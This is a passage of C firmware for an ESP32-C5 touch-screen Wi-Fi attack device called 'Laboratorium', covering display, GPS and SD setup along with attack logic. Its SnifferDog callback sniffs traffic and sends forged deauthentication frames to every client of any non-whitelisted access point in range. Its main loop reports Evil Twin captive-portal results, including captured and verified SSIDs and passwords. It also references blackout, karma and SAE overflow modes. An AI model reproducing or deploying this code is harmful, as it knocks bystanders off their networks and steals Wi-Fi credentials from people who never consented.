        if (!evil_twin_log_capture_enabled && !blackout_log_capture_enabled && !snifferdog_log_capture_enabled && !sniffer_log_capture_enabled && !sae_overflow_log_capture_enabled && !wardrive_log_capture_enabled && !karma_log_capture_enabled) {
            previous_vprintf = esp_log_set_vprintf(dual_vprintf);
        }
        handshake_log_capture_enabled = true;
    }

    return ESP_OK;
}

static void handshake_disable_log_capture(void)
{
    if (handshake_log_capture_enabled) {
        handshake_log_capture_enabled = false;
        if (!evil_twin_log_capture_enabled && !blackout_log_capture_enabled && !snifferdog_log_capture_enabled && !sniffer_log_capture_enabled && !sae_overflow_log_capture_enabled && !wardrive_log_capture_enabled && !karma_log_capture_enabled) {
            esp_log_set_vprintf(previous_vprintf ? previous_vprintf : rom_vprintf);
            previous_vprintf = NULL;
        }
    }

    if (handshake_log_queue) {
        xQueueReset(handshake_log_queue);
    }
}

static esp_err_t wardrive_enable_log_capture(void)
{
    if (!wardrive_log_queue) {
        wardrive_log_queue = xQueueCreate(32, sizeof(evil_log_msg_t));
        if (!wardrive_log_queue) {
            return ESP_ERR_NO_MEM;
        }
    } else {
        xQueueReset(wardrive_log_queue);
    }

    if (!wardrive_log_capture_enabled) {
        if (!evil_twin_log_capture_enabled && !blackout_log_capture_enabled && !snifferdog_log_capture_enabled && !sniffer_log_capture_enabled && !sae_overflow_log_capture_enabled && !handshake_log_capture_enabled && !karma_log_capture_enabled) {
            previous_vprintf = esp_log_set_vprintf(dual_vprintf);
        }
        wardrive_log_capture_enabled = true;
    }

    return ESP_OK;
}

static void wardrive_disable_log_capture(void)
{
    if (wardrive_log_capture_enabled) {
        wardrive_log_capture_enabled = false;
        if (!evil_twin_log_capture_enabled && !blackout_log_capture_enabled && !snifferdog_log_capture_enabled && !sniffer_log_capture_enabled && !sae_overflow_log_capture_enabled && !handshake_log_capture_enabled && !karma_log_capture_enabled) {
            esp_log_set_vprintf(previous_vprintf ? previous_vprintf : rom_vprintf);
            previous_vprintf = NULL;
        }
    }

    if (wardrive_log_queue) {
        xQueueReset(wardrive_log_queue);
    }
}

static esp_err_t karma_enable_log_capture(void)
{
    if (!karma_log_queue) {
        karma_log_queue = xQueueCreate(32, sizeof(evil_log_msg_t));
        if (!karma_log_queue) {
            return ESP_ERR_NO_MEM;
        }
    } else {
        xQueueReset(karma_log_queue);
    }

    if (!karma_log_capture_enabled) {
        if (!evil_twin_log_capture_enabled && !blackout_log_capture_enabled && !snifferdog_log_capture_enabled && !sniffer_log_capture_enabled && !sae_overflow_log_capture_enabled && !handshake_log_capture_enabled && !wardrive_log_capture_enabled) {
            previous_vprintf = esp_log_set_vprintf(dual_vprintf);
        }
        karma_log_capture_enabled = true;
    }

    return ESP_OK;
}

static void karma_disable_log_capture(void)
{
    if (karma_log_capture_enabled) {
        karma_log_capture_enabled = false;
        if (!evil_twin_log_capture_enabled && !blackout_log_capture_enabled && !snifferdog_log_capture_enabled && !sniffer_log_capture_enabled && !sae_overflow_log_capture_enabled && !handshake_log_capture_enabled && !wardrive_log_capture_enabled) {
            esp_log_set_vprintf(previous_vprintf ? previous_vprintf : rom_vprintf);
            previous_vprintf = NULL;
        }
    }

    if (karma_log_queue) {
        xQueueReset(karma_log_queue);
    }
}

void lvgl_tick_task(void *arg)
{
    lv_tick_inc(10);
}

// Forward declarations
void print_memory_stats(void);

// Helper function to check heap integrity with detailed logging
static void check_heap_integrity(const char* location) {
    bool is_ok = heap_caps_check_integrity_all(true);
    if (!is_ok) { 
        ESP_LOGE(TAG, "[HEAP CHECK] ❌ CORRUPTION DETECTED at: %s", location);
    } else {
        ESP_LOGE(TAG, "[HEAP CHECK] ✅ Heap integrity OK at: %s", location);
    }
}

static void init_display(void)
{    
    spi_bus_config_t buscfg = {
        .mosi_io_num = LCD_MOSI,
        .miso_io_num = LCD_MISO,
        .sclk_io_num = LCD_CLK,
        .quadwp_io_num = -1,
        .quadhd_io_num = -1,
        .max_transfer_sz = LCD_H_RES * 64 * sizeof(uint16_t),  // 64 lines instead of full screen (60KB vs 300KB)
    };
    
    ESP_ERROR_CHECK(spi_bus_initialize(LCD_HOST, &buscfg, SPI_DMA_CH_AUTO));
    esp_lcd_panel_io_handle_t io_handle;
    esp_lcd_panel_io_spi_config_t io_config = {
        .dc_gpio_num = LCD_DC,
        .cs_gpio_num = LCD_CS,
        .pclk_hz = 40 * 1000 * 1000,
        .lcd_cmd_bits = 8,
        .lcd_param_bits = 8,
        .spi_mode = 0,
        .trans_queue_depth = 10,
        .flags = {
            .dc_low_on_data = 0,
            .lsb_first = 0,
        },
    };

    ESP_ERROR_CHECK(esp_lcd_new_panel_io_spi(LCD_HOST, &io_config, &io_handle));
    
    const esp_lcd_panel_dev_config_t panel_config = {
        .reset_gpio_num = LCD_RST,
        .rgb_ele_order = LCD_RGB_ELEMENT_ORDER_BGR, 
        .bits_per_pixel = 16,
    };

    // CRITICAL FIX for Waveshare ESP32-C5:
    // GPIO 2 and 3 are strapping pins - must reset and configure before use
    gpio_reset_pin(LCD_RST);
    gpio_reset_pin(LCD_DC);
    gpio_reset_pin(LCD_CS);
    
    gpio_set_direction(LCD_RST, GPIO_MODE_OUTPUT);
    gpio_set_direction(LCD_DC, GPIO_MODE_OUTPUT);
    gpio_set_direction(LCD_CS, GPIO_MODE_OUTPUT);
    
    // Hardware reset LCD
    gpio_set_level(LCD_RST, 0);
    vTaskDelay(pdMS_TO_TICKS(100));
    gpio_set_level(LCD_RST, 1);
    vTaskDelay(pdMS_TO_TICKS(120));

    ESP_ERROR_CHECK(esp_lcd_new_panel_ili9341(io_handle, &panel_config, &panel_handle));
    
    // Memory barrier and heap validation AFTER
    asm volatile("fence" ::: "memory");
        
    ESP_ERROR_CHECK(esp_lcd_panel_reset(panel_handle));
    
    ESP_ERROR_CHECK(esp_lcd_panel_init(panel_handle));

    asm volatile("fence" ::: "memory");
    
    ESP_ERROR_CHECK(esp_lcd_panel_invert_color(panel_handle, true));  // Enable color inversion to fix RGB/BGR swap
    ESP_ERROR_CHECK(esp_lcd_panel_mirror(panel_handle, true, true));
    ESP_ERROR_CHECK(esp_lcd_panel_swap_xy(panel_handle, true));
    
    // Display will be turned on after UI is fully created (prevents boot flash)
    
    vTaskDelay(pdMS_TO_TICKS(50));
}


void print_memory_stats(void) {
    // Heap info
    ESP_LOGI("MEM", "=== HEAP STATUS ===");
    ESP_LOGI("MEM", "Free heap: %lu bytes", esp_get_free_heap_size());
    ESP_LOGI("MEM", "Min free heap: %lu bytes", esp_get_minimum_free_heap_size());
    
    // Internal RAM
    ESP_LOGI("MEM", "Internal free: %lu bytes", 
             heap_caps_get_free_size(MALLOC_CAP_INTERNAL));
    ESP_LOGI("MEM", "Internal min: %lu bytes", 
             heap_caps_get_minimum_free_size(MALLOC_CAP_INTERNAL));
    
    // PSRAM
    ESP_LOGI("MEM", "PSRAM free: %lu bytes", 
             heap_caps_get_free_size(MALLOC_CAP_SPIRAM));
    ESP_LOGI("MEM", "PSRAM min: %lu bytes", 
             heap_caps_get_minimum_free_size(MALLOC_CAP_SPIRAM));
    
    // DMA-capable
    ESP_LOGI("MEM", "DMA-capable free: %lu bytes", 
             heap_caps_get_free_size(MALLOC_CAP_DMA));
}

// Helper functions for Wardrive
static void get_timestamp_string(char* buffer, size_t size) {
    static uint32_t timestamp_counter = 0;
    timestamp_counter++;
    snprintf(buffer, size, "2025-09-26 %02d:%02d:%02d", 
             (int)((timestamp_counter / 3600) % 24),
             (int)((timestamp_counter / 60) % 60), 
             (int)(timestamp_counter % 60));
}

static const char* get_auth_mode_wiggle(wifi_auth_mode_t mode) {
    switch(mode) {
        case WIFI_AUTH_OPEN:
            return "Open";
        case WIFI_AUTH_WEP:
            return "WEP";
        case WIFI_AUTH_WPA_PSK:
            return "WPA_PSK";
        case WIFI_AUTH_WPA2_PSK:
            return "WPA2_PSK";
        case WIFI_AUTH_WPA_WPA2_PSK:
            return "WPA_WPA2_PSK";
        case WIFI_AUTH_WPA2_ENTERPRISE:
            return "WPA2_ENTERPRISE";
        case WIFI_AUTH_WPA3_PSK:
            return "WPA3_PSK";
        case WIFI_AUTH_WPA2_WPA3_PSK:
            return "WPA2_WPA3_PSK";
        case WIFI_AUTH_WAPI_PSK:
            return "WAPI_PSK";
        default:
            return "Unknown";
    }
}

static bool wait_for_gps_fix(int timeout_seconds) {
    int elapsed = 0;
    current_gps.valid = false;
    
    ESP_LOGI(TAG, "Waiting for GPS fix (timeout: %d seconds)...", timeout_seconds);
    
    while (elapsed < timeout_seconds) {
        if (!wardrive_active) {
            ESP_LOGI(TAG, "GPS wait: Stop requested");
            return false;
        }
        
        int len = uart_read_bytes(GPS_UART_NUM, (uint8_t*)wardrive_gps_buffer, GPS_BUF_SIZE - 1, pdMS_TO_TICKS(1000));
        if (len > 0) {
            wardrive_gps_buffer[len] = '\0';
            char* line = strtok(wardrive_gps_buffer, "\r\n");
            while (line != NULL) {
                if (parse_gps_nmea(line)) {
                    if (current_gps.valid) {
                        return true;
                    }
                }
                line = strtok(NULL, "\r\n");
            }
        }
        
        elapsed++;
        if (elapsed % 10 == 0) {
            ESP_LOGI(TAG, "Still waiting for GPS fix... (%d/%d seconds)", elapsed, timeout_seconds);
        }
    }
    
    return false;
}

// Snifferdog channel hopping
static void sniffer_dog_channel_hop(void) {
    if (!sniffer_dog_active) {
        return;
    }
    
    sniffer_dog_current_channel = dual_band_channels[sniffer_dog_channel_index];
    sniffer_dog_channel_index++;
    if (sniffer_dog_channel_index >= dual_band_channels_count) {
        sniffer_dog_channel_index = 0;
    }
    
    esp_wifi_set_channel(sniffer_dog_current_channel, WIFI_SECOND_CHAN_NONE);
    sniffer_dog_last_channel_hop = esp_timer_get_time() / 1000;
}

// Snifferdog channel hopping task
static void sniffer_dog_task(void *pvParameters) {
    (void)pvParameters;
    
    ESP_LOGI(TAG, "SnifferDog channel hop task started");
    
    while (sniffer_dog_active) {
        vTaskDelay(pdMS_TO_TICKS(50));
        
        if (!sniffer_dog_active) {
            continue;
        }
        
        int64_t current_time = esp_timer_get_time() / 1000;
        bool time_expired = (current_time - sniffer_dog_last_channel_hop >= sniffer_channel_hop_delay_ms);
        
        if (time_expired) {
            sniffer_dog_channel_hop();
        }
    }
    
    ESP_LOGI(TAG, "SnifferDog channel hop task ending");
    sniffer_dog_task_handle = NULL;
    vTaskDelete(NULL);
}

// Snifferdog promiscuous callback - captures AP-STA pairs and sends deauth
static void sniffer_dog_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
    static uint32_t deauth_sent_count = 0;
    
    if (!sniffer_dog_active) {
        return;
    }
    
    // Filter only MGMT and DATA packets
    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) {
        return;
    }
    
    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *frame = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    
    if (len < 24) {
        return;
    }
    
    // Parse 802.11 header
    uint8_t frame_type = frame[0] & 0xFC;
    uint8_t to_ds = (frame[1] & 0x01) != 0;
    uint8_t from_ds = (frame[1] & 0x02) != 0;
    
    // Extract addresses
    uint8_t *addr1 = (uint8_t *)&frame[4];
    uint8_t *addr2 = (uint8_t *)&frame[10];
    
    uint8_t *ap_mac = NULL;
    uint8_t *sta_mac = NULL;
    
    // Identify AP and STA based on frame type and DS bits
    if (type == WIFI_PKT_DATA) {
        if (to_ds && !from_ds) {
            sta_mac = addr2;
            ap_mac = addr1;
        } else if (!to_ds && from_ds) {
            ap_mac = addr2;
            sta_mac = addr1;
        } else {
            return;
        }
    } else if (type == WIFI_PKT_MGMT) {
        switch (frame_type) {
            case 0x00: // Association Request
            case 0x20: // Reassociation Request
            case 0xB0: // Authentication
                sta_mac = addr2;
                ap_mac = addr1;
                break;
            case 0x10: // Association Response
            case 0x30: // Reassociation Response
                ap_mac = addr2;
                sta_mac = addr1;
                break;
            default:
                return;
        }
    }
    
    if (!ap_mac || !sta_mac) {
        return;
    }
    
    // Skip broadcast/multicast addresses
    if (is_broadcast_bssid(ap_mac) || is_broadcast_bssid(sta_mac) ||
        is_multicast_mac(ap_mac) || is_multicast_mac(sta_mac) ||
        is_own_device_mac(ap_mac) || is_own_device_mac(sta_mac)) {
        return;
    }
    
    // Check if AP BSSID is whitelisted
    if (is_bssid_whitelisted(ap_mac)) {
        return;
    }
    
    // Send deauth frame from AP to STA
    uint8_t deauth_frame[sizeof(deauth_frame_default)];
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    
    memcpy(&deauth_frame[4], sta_mac, 6);   // Destination: specific STA
    memcpy(&deauth_frame[10], ap_mac, 6);   // Source: AP
    memcpy(&deauth_frame[16], ap_mac, 6);   // BSSID: AP
    
    esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame_default), false);
    deauth_sent_count++;
    
    // Log deauth
    ESP_LOGI(TAG, "[SnifferDog #%lu] DEAUTH: AP=%02X:%02X:%02X:%02X:%02X:%02X -> STA=%02X:%02X:%02X:%02X:%02X:%02X (Ch=%d, RSSI=%d)",
             deauth_sent_count,
             ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5],
             sta_mac[0], sta_mac[1], sta_mac[2], sta_mac[3], sta_mac[4], sta_mac[5],
             sniffer_dog_current_channel, pkt->rx_ctrl.rssi);
}

// Sniffer task - calls wifi_sniffer_start and runs until stopped
static void sniffer_task(void *pvParameters) {
    (void)pvParameters;
    
    ESP_LOGI(TAG, "Sniffer task started");
    
    // Start wifi_sniffer
    esp_err_t ret = wifi_sniffer_start();
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Failed to start wifi_sniffer: %s", esp_err_to_name(ret));
        sniffer_task_active = false;
        sniffer_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }
    
    // Keep task running until sniffer_task_active is set to false
    while (sniffer_task_active) {
        vTaskDelay(pdMS_TO_TICKS(1000));
    }
    
    // Stop wifi_sniffer
    wifi_sniffer_stop();
    
    ESP_LOGI(TAG, "Sniffer task ending");
    sniffer_task_handle = NULL;
    vTaskDelete(NULL);
}

static void init_i2c(void)
{
    // Use OLD I2C API (more stable, less memory overhead)
    i2c_config_t conf = {
        .mode = I2C_MODE_MASTER,
        .sda_io_num = CTP_SDA,
        .scl_io_num = CTP_SCL,
        .sda_pullup_en = GPIO_PULLUP_ENABLE,
        .scl_pullup_en = GPIO_PULLUP_ENABLE,
        .master.clk_speed = 400000,  // 400kHz
    };
    

    ESP_LOGI(TAG, "Initializing I2C (old API) on SDA=%d, SCL=%d", CTP_SDA, CTP_SCL);

    esp_err_t ret = i2c_param_config(I2C_NUM_0, &conf);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "I2C param config failed: %s", esp_err_to_name(ret));
        return;
    }
    
    ret = i2c_driver_install(I2C_NUM_0, conf.mode, 0, 0, 0);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "I2C driver install failed: %s", esp_err_to_name(ret));
        return;
    }
    
    ESP_LOGI(TAG, "I2C bus initialized successfully");
}

static void init_touch(void)
{
    esp_err_t ret = ft6336_init(&touch_handle, I2C_NUM_0, CTP_INT, CTP_RST,
                                LCD_H_RES, LCD_V_RES);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Touch init failed: %s", esp_err_to_name(ret));
    } else {
        ESP_LOGI(TAG, "FT6336U touch initialized");
    }
}

static void log_sd_root_listing(void)
{
    DIR *dir = opendir("/sdcard");
    if (!dir) {
        ESP_LOGW(TAG, "opendir(/sdcard) failed");
        return;
    }
    ESP_LOGI(TAG, "SD root listing:");
    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        char path[256];
        int safe_len = (int)sizeof(path) - 9; // 256 - 1 (NUL) - strlen("/sdcard/") = 247
        if (safe_len < 0) safe_len = 0;
        snprintf(path, sizeof(path), "/sdcard/%.*s", safe_len, entry->d_name);
        struct stat st;
        if (stat(path, &st) == 0) {
            if (S_ISDIR(st.st_mode)) {
                ESP_LOGI(TAG, "  [DIR] %s", entry->d_name);
            } else {
                ESP_LOGI(TAG, "  %s (%ld bytes)", entry->d_name, (long)st.st_size);
            }
        } else {
            ESP_LOGI(TAG, "  %s", entry->d_name);
        }
    }
    closedir(dir);
}

// SD card init task with larger stack to prevent stack overflow
static void sd_init_task(void *param)
{
    esp_err_t ret = wifi_wardrive_init_sd();
    
    if (ret == ESP_OK) {
        ESP_LOGI(TAG, "[SD_TASK] SD card mount successful!");
        log_sd_root_listing();
        ESP_LOGI(TAG, "[SD_TASK] SD card ready for use");
    } else {
        ESP_LOGW(TAG, "[SD_TASK] SD card initialization failed with error: %s (0x%x)", 
                 esp_err_to_name(ret), ret);
        ESP_LOGW(TAG, "[SD_TASK] System will continue without SD card");
    }
    
    ESP_LOGI(TAG, "[SD_TASK] Task complete, deleting self");
    vTaskDelete(NULL);
}

// Load whitelist from SD card
void load_whitelist_from_sd(void) {
    whitelistedBssidsCount = 0; // Reset count
    
    ESP_LOGI(TAG, "Loading whitelist from /sdcard/lab/white.txt...");
    
    // SD card should already be mounted by sd_card_task
    // Just try to open the file directly
    FILE *file = fopen("/sdcard/lab/white.txt", "r");
    if (file == NULL) {
        ESP_LOGI(TAG, "white.txt not found on SD card - whitelist will be empty");
        return;
    }
    
    ESP_LOGI(TAG, "Found white.txt, loading whitelisted BSSIDs...");
    
    char line[128];
    int line_number = 0;
    int loaded_count = 0;
    
    while (fgets(line, sizeof(line), file) != NULL && whitelistedBssidsCount < MAX_WHITELISTED_BSSIDS) {
        line_number++;
        
        // Remove trailing newline/whitespace
        line[strcspn(line, "\r\n")] = '\0';
        
        // Skip empty lines
        if (strlen(line) == 0) {
            continue;
        }
        
        // Parse BSSID in format: XX:XX:XX:XX:XX:XX or XX-XX-XX-XX-XX-XX
        uint8_t bssid[6];
        int matches = 0;
        
        // Try with colon separator
        matches = sscanf(line, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                        &bssid[0], &bssid[1], &bssid[2],
                        &bssid[3], &bssid[4], &bssid[5]);
        
        // If that didn't work, try with dash separator
        if (matches != 6) {
            matches = sscanf(line, "%hhx-%hhx-%hhx-%hhx-%hhx-%hhx",
                            &bssid[0], &bssid[1], &bssid[2],
                            &bssid[3], &bssid[4], &bssid[5]);
        }
        
        if (matches == 6) {
            // Valid BSSID found, add to whitelist
            memcpy(whiteListedBssids[whitelistedBssidsCount].bssid, bssid, 6);
            whitelistedBssidsCount++;
            loaded_count++;
            
            ESP_LOGI(TAG, "  [%d] Loaded: %02X:%02X:%02X:%02X:%02X:%02X",
                     loaded_count,
                     bssid[0], bssid[1], bssid[2],
                     bssid[3], bssid[4], bssid[5]);
        } else {
            ESP_LOGI(TAG, "  Line %d: Invalid BSSID format, ignoring: %s", line_number, line);
        }
    }
    
    fclose(file);
    
    if (whitelistedBssidsCount > 0) {
        ESP_LOGI(TAG, "Successfully loaded %d whitelisted BSSID(s)", whitelistedBssidsCount);
    } else {
        ESP_LOGI(TAG, "No valid BSSIDs found in white.txt");
    }
}

// Check if a BSSID is in the whitelist
bool is_bssid_whitelisted(const uint8_t *bssid) {
    if (bssid == NULL || whitelistedBssidsCount == 0) {
        return false;
    }
    
    for (int i = 0; i < whitelistedBssidsCount; i++) {
        if (memcmp(bssid, whiteListedBssids[i].bssid, 6) == 0) {
            return true;
        }
    }
    
    return false;
}

void app_main(void)
{
	//Initialize GPS UART and start background monitor task
	if (init_gps_uart() == ESP_OK) {
		ESP_LOGI(TAG, "GPS UART initialized on TX=%d RX=%d", GPS_TX_PIN, GPS_RX_PIN);
		// Allocate GPS task stack from PSRAM
		gps_task_stack = (StackType_t *)heap_caps_malloc(4096 * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
		if (gps_task_stack != NULL) {
			TaskHandle_t task_handle = xTaskCreateStatic(gps_task, "gps_task", 4096, NULL, 
				tskIDLE_PRIORITY + 1, gps_task_stack, &gps_task_buffer);
			if (task_handle == NULL) {
				ESP_LOGE(TAG, "Failed to start GPS task");
				heap_caps_free(gps_task_stack);
				gps_task_stack = NULL;
			} else {
				ESP_LOGI(TAG, "GPS monitor running in background (PSRAM) (log every few seconds)");
			}
		} else {
			ESP_LOGE(TAG, "Failed to allocate GPS task stack from PSRAM");
		}
	} else {
		ESP_LOGE(TAG, "GPS UART init failed");
	}
    
    // Initialize WiFi CLI system (WiFi, LED, all components)
    esp_err_t ret = wifi_cli_init();
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "WiFi CLI init failed: %s", esp_err_to_name(ret));
    } else {
        ESP_LOGI(TAG, "WiFi CLI system initialized");
        // Set radio mode to WiFi after successful init
        current_radio_mode = RADIO_MODE_WIFI;
        wifi_initialized = true;
        // Start console in background (optional)
        // wifi_cli_start_console();
    }

    
    // Init scanner and register event handler
    wifi_scanner_init();
    esp_event_handler_register(WIFI_EVENT, WIFI_EVENT_SCAN_DONE, &wifi_scan_done_cb, NULL);

    // Initialize custom LVGL memory allocator EARLY
    ESP_LOGI(TAG, "LVGL INIT");
    lvgl_memory_init();
    
    // Initialize I2C BEFORE LVGL GUI to avoid memory fragmentation
    ESP_LOGI(TAG, "Initializing I2C for capacitive touch...");
    init_i2c();
    init_touch();

    ESP_LOGI(TAG, "LV INIT");
    lv_init();
    init_display();

    ESP_LOGI(TAG, "Display hardware initialized");
    
    ESP_LOGI(TAG, "=== INITIALIZING SD CARD ===");
    // Allocate SD init task stack from PSRAM
    sd_init_task_stack = (StackType_t *)heap_caps_malloc(8192 * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
    if (sd_init_task_stack != NULL) {
        TaskHandle_t task_handle = xTaskCreateStatic(sd_init_task, "sd_init", 8192, NULL, 
            5, sd_init_task_stack, &sd_init_task_buffer);
        if (task_handle == NULL) {
            ESP_LOGE(TAG, "Failed to create SD init task");
            heap_caps_free(sd_init_task_stack);
            sd_init_task_stack = NULL;
        } else {
            ESP_LOGI(TAG, "SD init task created with PSRAM stack");
        }
    } else {
        ESP_LOGE(TAG, "Failed to allocate SD init task stack from PSRAM");
    }
    
    // Give SD init task time to complete (it will self-delete)
    // Wait longer to ensure SD mount completes before starting LCD drawing
    vTaskDelay(pdMS_TO_TICKS(2000));  // 2 seconds to complete SD init
         
    // Create LVGL mutex for thread safety
    lvgl_mutex = xSemaphoreCreateMutex();
    if (lvgl_mutex == NULL) {
        ESP_LOGE(TAG, "Failed to create LVGL mutex!");
        return;
    }
    
    // Create SD/SPI mutex (SD and display share same SPI bus)
    sd_spi_mutex = xSemaphoreCreateMutex();
    if (sd_spi_mutex == NULL) {
        ESP_LOGE(TAG, "Failed to create SD/SPI mutex!");
        return;
    }

    // For 32-bit color depth, we need to reduce buffer size due to memory constraints
    // 15 lines * 480 pixels * 4 bytes = 28.8 KB per buffer (vs 28.8 KB for 30 lines @ 16-bit)
    const size_t buf_size = LCD_H_RES * 15 * sizeof(lv_color_t);
    // Allocate display draw buffers strictly from internal DMA-capable memory
    buf1 = heap_caps_malloc(buf_size, MALLOC_CAP_DMA);
    buf2 = heap_caps_malloc(buf_size, MALLOC_CAP_DMA);
    if (buf1 == NULL || buf2 == NULL) {
        ESP_LOGE(TAG, "Failed to allocate draw buffers!");
        return;
    }
    ESP_LOGI(TAG, "Display buffers allocated: buf1=%p, buf2=%p (size: %zu bytes each)", buf1, buf2, buf_size);

    lv_disp_draw_buf_init(&draw_buf, buf1, buf2, LCD_H_RES * 15);
    static lv_disp_drv_t disp_drv;
    lv_disp_drv_init(&disp_drv);
    disp_drv.hor_res = LCD_H_RES;
    disp_drv.ver_res = LCD_V_RES;
    disp_drv.flush_cb = lvgl_flush_cb;
    disp_drv.draw_buf = &draw_buf;
    disp_drv.user_data = panel_handle;
    lv_disp_drv_register(&disp_drv);

    uint16_t black = 0x0000;
    for (int i = 0; i < LCD_H_RES * 30; i++) {
        ((uint16_t*)buf1)[i] = black;
    }
    for (int y = 0; y < LCD_V_RES; y += 30) {
        int lines = (y + 30 <= LCD_V_RES) ? 30 : (LCD_V_RES - y);
        esp_lcd_panel_draw_bitmap(panel_handle, 0, y, LCD_H_RES, y + lines, buf1);
    }
    
    lv_obj_set_style_bg_color(lv_scr_act(), lv_color_black(), 0);

    ESP_LOGI(TAG, "LVGL OBJECTS:");

    // Set screen background to Material Dark
    lv_obj_set_style_bg_color(lv_scr_act(), lv_color_make(18, 18, 18), 0);  // #121212
    
    // Title bar - Material Dark Surface
    title_bar = lv_obj_create(lv_scr_act());
    lv_obj_set_size(title_bar, lv_pct(100), 30);
    lv_obj_align(title_bar, LV_ALIGN_TOP_MID, 0, 0);
    lv_obj_set_style_bg_color(title_bar, lv_color_make(30, 30, 30), 0);  // #1E1E1E
    lv_obj_set_style_border_width(title_bar, 0, 0);
    lv_obj_set_style_radius(title_bar, 0, 0);
    lv_obj_clear_flag(title_bar, LV_OBJ_FLAG_SCROLLABLE);  // No scroll
    
    lv_obj_t *title_label = lv_label_create(title_bar);
    lv_label_set_text(title_label, "Laboratorium");
    lv_obj_set_style_text_color(title_label, lv_color_make(255, 255, 255), 0);  // White text
    lv_obj_center(title_label);
    
    // Create tile-based main menu
    show_main_tiles();
    
    // DEBUG: Visual touch indicator (red dot)
    touch_dot = lv_obj_create(lv_scr_act());
    lv_obj_set_size(touch_dot, 10, 10);
    lv_obj_set_style_bg_color(touch_dot, lv_color_make(255, 0, 0), 0);
    lv_obj_set_style_border_width(touch_dot, 0, 0);
    lv_obj_set_style_radius(touch_dot, 5, 0);
    lv_obj_add_flag(touch_dot, LV_OBJ_FLAG_HIDDEN);
    lv_obj_add_flag(touch_dot, LV_OBJ_FLAG_FLOATING);
    
    lv_obj_invalidate(lv_scr_act());
    lv_refr_now(NULL);
    
    // Now that UI is fully created, turn on display (prevents boot flash)
    ESP_ERROR_CHECK(esp_lcd_panel_disp_on_off(panel_handle, true));
    
    vTaskDelay(pdMS_TO_TICKS(100));
    
    static lv_indev_drv_t indev_drv;
    lv_indev_drv_init(&indev_drv);
    indev_drv.type = LV_INDEV_TYPE_POINTER;
    indev_drv.read_cb = lvgl_touch_read_cb;
    indev_drv.user_data = &touch_handle;
    lv_indev_drv_register(&indev_drv);

    const esp_timer_create_args_t periodic_timer_args = {
        .callback = &lvgl_tick_task,
        .name = "lvgl_tick"
    };
    esp_timer_handle_t periodic_timer;
    ESP_ERROR_CHECK(esp_timer_create(&periodic_timer_args, &periodic_timer));
    ESP_ERROR_CHECK(esp_timer_start_periodic(periodic_timer, 10 * 1000));
    
    // Load BSSID whitelist from SD card
    load_whitelist_from_sd();
    vTaskDelay(pdMS_TO_TICKS(500));
    
    // Initialize portal HTML buffer (1MB in PSRAM for large HTML files up to 900KB)
    ESP_LOGI(TAG, "Initializing portal HTML buffer in PSRAM...");
    esp_err_t html_ret = wifi_attacks_init_portal_html_buffer();
    if (html_ret == ESP_OK) {
        ESP_LOGI(TAG, "Portal HTML buffer ready (1MB PSRAM allocated)");
    } else {
        ESP_LOGW(TAG, "Portal HTML buffer allocation failed - large HTML files may not work");
    }
    
    ESP_LOGI(TAG, "System ready!");
    ESP_LOGI(TAG, "[DIAG] System ready - final memory state");
    check_heap_integrity("Before main loop");
    print_memory_stats();

    // Subscribe main task to watchdog to prevent IDLE task starvation during LVGL rendering
    esp_task_wdt_add(NULL);
    ESP_LOGI(TAG, "Main task subscribed to watchdog");

    while (1) {
        // Thread-safe LVGL handling
        uint32_t sleep_ms = 10;
        if (xSemaphoreTake(lvgl_mutex, portMAX_DELAY) == pdTRUE) {
            // Apply touch indicator changes outside indev callback
            if (touch_dot && show_touch_dot) {
                if (touch_pressed_flag) {
                    lv_obj_clear_flag(touch_dot, LV_OBJ_FLAG_HIDDEN);
                    lv_obj_set_pos(touch_dot, (int)touch_x_flag - 5, (int)touch_y_flag - 5);
                    lv_obj_move_foreground(touch_dot);  // Ensure dot is always on top
                } else {
                    lv_obj_add_flag(touch_dot, LV_OBJ_FLAG_HIDDEN);
                }
            }

            // Handle deferred back navigation safely
            if (nav_to_menu_flag) {
                nav_to_menu_flag = false;
                show_menu();
            }

            // Process Evil Twin UI events
            if (evil_twin_event_queue && evil_twin_status_list) {
                evil_twin_event_data_t evt;
                while (xQueueReceive(evil_twin_event_queue, &evt, 0) == pdTRUE) {
                    char msg[160];
                    lv_color_t color = COLOR_MATERIAL_BLUE;
                    
                    switch (evt.event) {
                        case EVIL_TWIN_EVENT_DEAUTH_STARTED:
                            strcpy(msg, "Deauth started");
                            break;
                        case EVIL_TWIN_EVENT_PORTAL_DEPLOYED:
                            strcpy(msg, "Portal deployed");
                            break;
                        case EVIL_TWIN_EVENT_CLIENT_CONNECTED:
                            strcpy(msg, "Client connected");
                            color = lv_color_make(100, 255, 100);  // Green
                            break;
                        case EVIL_TWIN_EVENT_CLIENT_DISCONNECTED:
                            strcpy(msg, "Client disconnected");
                            color = lv_color_make(255, 200, 100);  // Orange
                            break;
                        case EVIL_TWIN_EVENT_PASSWORD_PROVIDED:
                            strcpy(msg, "Password provided");
                            color = lv_color_make(255, 255, 100);  // Yellow
                            break;
                        case EVIL_TWIN_EVENT_PASSWORD_FAILED:
                            strcpy(msg, "Password failed");
                            color = lv_color_make(255, 100, 100);  // Red
                            break;
                        case EVIL_TWIN_EVENT_PASSWORD_VERIFIED:
                            snprintf(msg, sizeof(msg), "Password verified, credentials saved:\n  SSID: %s\n  Pass: %s",
                                     evt.ssid, evt.password);
                            color = lv_color_make(100, 255, 100);  // Green
                            break;
                        default:
                            continue;
                    }
                    
                    evil_twin_add_status_message(msg, color);
                }
            }

            if (evil_twin_log_ta && evil_twin_log_queue) {
                evil_log_msg_t msg;
